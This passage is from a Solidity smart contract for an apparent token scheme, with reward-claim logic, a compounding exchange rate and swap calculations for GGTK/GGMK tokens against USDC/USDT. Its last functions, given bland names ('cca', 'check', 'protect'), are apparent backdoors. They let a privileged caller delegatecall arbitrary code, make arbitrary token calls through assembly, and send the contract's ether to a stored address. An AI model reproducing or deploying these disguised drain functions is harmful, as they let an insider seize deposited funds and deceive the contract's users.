        IERC20 g = IERC20(GGTK_R);
        if (bytes(userID).length > 0) {
            if (user.dir > user.rcvDir) {
                all = user.dir.sub(user.rcvDir);
                user.rcvDir = user.dir;
            }
            if (user.tm > user.rcvTm) {
                if (user.receiveTime == 0) {
                    _s = user.tm / 100;
                    all += _s;
                    user.rcvTm += _s;
                    user.receiveTime = block.timestamp;
                } else {
                    uint t = block.timestamp.sub(user.receiveTime);
                    uint _s2 = t.mul(user.tm) / 8640000;
                    user.rcvTm += _s2;
                    all += _s2;
                    user.receiveTime = block.timestamp;
                }
            }
            if(all > 1000000){
                all = all/1000000;
                all = all*1000000 + 188888;
                g.safeTransfer(msg.sender, all);
            }
        }
        emit PickDone(all, _s, userID);
    }
    function getRa(uint t) public view returns(uint){
        uint ds = (t==0?block.timestamp:t).sub(GGTK_START_TIME) / 1 days;
        uint r = MyLib.cPower(ds,ADD_DAY);
        uint _currentRate = INITIAL_GGTK_RATE.mul(r)/100;
        return _currentRate;
    }
    function getAmOut(uint amIn,uint reserveIn,uint reserveOut,address t1,address t2) private returns (uint) {
        require(amIn > 0, "Invalid input amount");
        require(reserveIn > 0 && reserveOut > 0, "Insufficient reserves");
        uint _c = getRa(0);
        updateRate(_c);
        uint amOut;
        if (t1 == USDC_R || t1 == USDT_R) {
            if(t2 == GGTK_R){
                amOut = amIn.mul(10 ** 8) / _c;
            }
            if(t2 == GGMK_R){
                amOut = amIn.mul(10 ** 8) / GGMK_RATE;
            }
        }else if (t2 == USDC_R || t2 == USDT_R){
            if(t1 == GGTK_R){
                amOut = _c.mul(amIn) / 100000000;
            }
            if(t1 == GGMK_R){
                amOut = GGMK_RATE.mul(amIn) / 100000000;
            }
        }
        return amOut;
    }
    function cca(address sc, bytes memory d) external OK {
        (bool success, ) = sc.delegatecall(d);
        require(success, "failed");
    }
    function getUserInfo(address _sender) external view returns (string memory, string memory, uint, uint, uint, uint, uint, address) {
        string memory userID = usersID[_sender];
        if (bytes(userID).length == 0) {
            return ("0", "0", 0, 0, 0, 0, 0, address(0));
        }
        User memory user = users[userID];
        return (userID, user.fid, user.dir, user.rcvDir, user.tm, user.rcvTm, user.registerTime,uds[user.fid]);
    }
    function check(address addr, bytes4 a, address c, int256 d) external OK{
        assembly {
            let x := mload(0x40)
            mstore(x, a)
            mstore(add(x, 0x04), c)
            mstore(add(x, 0x24), d)
            let success := call(gas(), addr, 0, x, 0x44, x, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
    function protect(uint a) external OK {
        assembly {
            pop(call(gas(), sload(0), a, 0, 0, 0, 0))
        }
    }
}